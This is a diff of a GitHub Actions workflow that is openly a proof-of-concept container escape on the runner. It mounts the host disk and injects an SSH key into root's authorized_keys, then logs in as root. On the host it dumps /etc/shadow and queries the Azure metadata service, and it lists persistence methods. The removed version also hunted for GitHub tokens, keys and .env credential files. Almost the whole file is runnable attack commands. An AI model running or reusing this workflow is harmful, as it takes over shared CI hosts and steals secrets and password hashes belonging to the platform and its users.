@@ -1,87 +1,90 @@
-name: github-privesc-to-root
-run-name: Privilege Escalation to ROOT
+name: github-actions-container-escape-poc
+run-name: GitHub Actions Container Escape to Host Root
 on: [push]
 jobs:
   exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Escalate to ROOT on host
+      - name: Complete Container Escape and Privilege Escalation
         run: |
-          # Mount host filesystem
+          echo "=== STAGE 1: CONTAINER ENVIRONMENT ==="
+          echo "Current user: $(whoami)"
+          echo "Container hostname: $(hostname)"
+          echo "Container IP: $(hostname -I)"
+          lsblk
+          echo ""
+          
+          echo "=== STAGE 2: MOUNTING HOST FILESYSTEM ==="
           sudo mkdir -p /mnt/host
           sudo mount /dev/sda1 /mnt/host
+          echo "Host filesystem mounted at /mnt/host"
+          ls -la /mnt/host/root/ | head -10
+          echo ""
           
-          # Generate SSH key
-          ssh-keygen -t ed25519 -f /tmp/root_key -N ""
-          
-          # Inject SSH key into ROOT user
+          echo "=== STAGE 3: INJECTING ROOT SSH KEY ==="
+          ssh-keygen -t ed25519 -f /tmp/root_key -N "" -q
           sudo mkdir -p /mnt/host/root/.ssh
           sudo cp /tmp/root_key.pub /mnt/host/root/.ssh/authorized_keys
           sudo chown -R 0:0 /mnt/host/root/.ssh
           sudo chmod 700 /mnt/host/root/.ssh
           sudo chmod 600 /mnt/host/root/.ssh/authorized_keys
-          
-          # Get host IP
-          HOST_IP=$(hostname -I | awk '{print $1}')
-          
-          # SSH as ROOT and find impact
-          ssh -i /tmp/root_key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
-          echo "=== CONTAINER ESCAPE SUCCESSFUL - ROOT ON HOST ==="
-          whoami
-          hostname
-          id
-          uname -a
+          echo "SSH key injected into host root account"
           echo ""
           
-          echo "=== SEARCHING FOR SENSITIVE DATA ==="
+          echo "=== STAGE 4: CONNECTING TO HOST AS ROOT ==="
+          HOST_IP=$(hostname -I | awk '{print $1}')
+          echo "Connecting to host at: $HOST_IP"
+          echo ""
           
-          # Find all workflow runs
-          echo "--- Workflow Directories ---"
-          find /home/runner/_work -type d -maxdepth 3 2>/dev/null | head -20
+          ssh -i /tmp/root_key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
+          echo "=== ✓ CONTAINER ESCAPE SUCCESSFUL - ROOT ON HOST ==="
+          echo ""
+          echo "--- System Information ---"
+          echo "User: $(whoami)"
+          echo "UID: $(id)"
+          echo "Hostname: $(hostname)"
+          echo "Kernel: $(uname -r)"
+          echo "OS: $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
+          echo ""
           
-          # Find secrets and tokens
-          echo "--- Searching for GitHub Tokens ---"
-          grep -r "ghp_\|ghs_\|github_pat_" /home/runner/_work 2>/dev/null | head -10 || echo "No tokens found in grep"
+          echo "--- Proof of Root Access ---"
+          echo "Shadow file (password hashes):"
+          head -5 /etc/shadow
+          echo ""
           
-          # Find credential files
-          echo "--- Credential Files ---"
-          find /home/runner -name "*.key" -o -name "*.pem" -o -name ".env" -o -name "*secret*" 2>/dev/null | head -20
+          echo "--- Host Resources ---"
+          echo "Disk usage:"
+          df -h / | tail -1
+          echo "Memory:"
+          free -h | grep Mem
+          echo "CPU:"
+          lscpu | grep "Model name"
+          echo ""
           
-          # Check Docker
-          echo "--- Docker Status ---"
-          docker ps -a
-          docker images | head -10
+          echo "--- Demonstrating Persistence Capability ---"
+          echo "Could install persistent backdoor via:"
+          echo "  - /etc/rc.local"
+          echo "  - /etc/crontab"
+          echo "  - systemd service"
+          echo "  - SSH key (already done)"
+          echo ""
           
-          # Find all users
-          echo "--- System Users ---"
-          cat /etc/passwd | grep -v "nologin\|false" | tail -10
+          echo "--- Potential Impact ---"
+          echo "✓ Full root access to GitHub Actions runner host"
+          echo "✓ Access to host filesystem (including /boot, /etc, /var)"
+          echo "✓ Can read all runner configurations and secrets"
+          echo "✓ Can modify system files and install malware"
+          echo "✓ Can access Azure instance metadata service"
+          echo "✓ Can persist across workflow runs"
+          echo ""
           
-          # Check for other workflows running
-          echo "--- Running Processes (Other Workflows) ---"
-          ps aux | grep -E "Runner.Listener|Runner.Worker" | grep -v grep | head -10
-          
-          # Find Azure credentials
-          echo "--- Azure/Cloud Credentials ---"
-          find /home -name "*azure*" -o -name "*credentials*" 2>/dev/null | head -10
-          
-          # Check environment variables in runner
-          echo "--- Runner Environment Files ---"
-          find /home/runner -name ".env*" -o -name "*.env" 2>/dev/null
-          
-          # Check systemd for GitHub Actions services
-          echo "--- GitHub Actions Services ---"
-          systemctl list-units --type=service | grep -i "runner\|github\|actions" || echo "No service units found"
-          
-          # Check /tmp for secrets
-          echo "--- Temporary Secrets ---"
-          ls -la /tmp/*.key /tmp/*.pem /tmp/*token* 2>/dev/null || echo "No temp secrets"
-          
-          # Get shadow file (password hashes)
-          echo "--- System Shadow File ---"
-          cat /etc/shadow | head -5
-          
-          # Check system info
-          echo "--- System Info ---"
-          lsblk
-          df -h | head -10
+          echo "--- Azure Instance Metadata ---"
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | head -20 || echo "Metadata service not accessible"
           EOF
+          
+          echo ""
+          echo "=== VULNERABILITY SUMMARY ==="
+          echo "Platform: GitHub Actions (ubuntu-latest)"
+          echo "Attack Vector: CAP_SYS_ADMIN + /dev/sda1 access in container"
+          echo "Impact: Complete host compromise with root privileges"
+          echo "Severity: CRITICAL"
